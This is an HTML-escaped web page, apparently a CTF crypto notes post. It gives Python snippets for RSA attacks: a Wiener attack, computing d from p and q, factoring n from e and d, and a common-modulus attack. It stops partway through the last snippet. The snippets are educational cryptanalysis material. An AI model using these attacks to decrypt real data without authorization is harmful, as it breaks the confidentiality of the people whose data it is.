&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt;  RSAwienerHacker&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  RSAwienerHacker&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;hack_RSA&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; d&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; hashlib&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;flag&amp;#123;&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; hashlib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;md5&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;hexdigest&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&amp;#125;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;pqe求d&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pqe求d&#34;&gt;#&lt;/a&gt; p,q,e 求 d&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; gmpy2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Util &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; number&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;473398607161&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;q &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4511491&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;17&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;ned求pq&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ned求pq&#34;&gt;#&lt;/a&gt; n,e,d 求 p,q&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; gmpy2 &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; next_prime&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; gcd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;Factorize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; d&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    g &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        k &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; e &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; d &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; k &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            k &lt;span class=&#34;token operator&#34;&gt;//=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gcd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; k&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; n&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        g &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;next_prime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;__main__&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x75be564267f8bf6c2038dd0cadfeecbc3158acfc27e679dd0bdb0db0e90bd5198a0a7edc0626f357a2d75f3c37ede045b7f7ca6bda79e5bf6fc0aea0aa7beda587388599d2b77b538fc3e666784493ffaf731e2ae232e8e9e9f9f2a4df25c19b7680f5bf6c485bd87923f01c17d8ec35438772c28e361774e6e7681d67ecbe19&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    e &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x14b367bf01efd4dc667b8e62975479c612c96e78f7f1f55242b2973c882ddcb33a65c52174d8ae1273764ce429054ea3f2fdc38ff205443c92ef4198739f05aa11fc10d3fc6ff30c8f5f05a04f43e3d8fc9bfffe916b2e0360560a162729e91b7775bda70177e0f875626e0a81bd4eacea9948b02232a82659f8d9aa9b4c754f&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    d &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;105446909057629013379692394355251350740773777593653963988108428818399001716079&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Factorize&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; d&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;共模攻击nm相同ce不同&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#共模攻击nm相同ce不同&#34;&gt;#&lt;/a&gt; 共模攻击 (n,m 相同，c,e 不同)&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; libnum &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; n2s&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;s2n&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; gmpy2 &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; invert&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;egcd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    g&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; y&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; egcd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;b &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;b &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; y&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  c1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  c2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  e1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  e2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; egcd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  s1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; s&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  s2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; s&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; s1&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    s1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; s1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    c1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; s2&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    s2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; s2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    c2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  m &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;s1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;s2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; n&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token 